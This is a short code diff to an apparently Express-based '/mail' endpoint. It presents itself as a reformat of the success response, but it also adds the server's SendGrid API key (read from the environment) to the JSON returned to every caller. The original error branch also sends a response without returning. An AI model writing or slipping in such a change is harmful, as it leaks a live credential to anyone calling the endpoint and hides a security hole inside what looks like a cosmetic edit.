@@ -36,7 +36,9 @@ app.post("/mail", (req, res) => {
     if (err) {
       res.status(500).json({ success: false, err });
     }
-    res.status(200).send({ success: true, result });
+    res
+      .status(200)
+      .send({ success: true, result, keys: process.env.SENDGRID_API_KEY });
   });
 });
 
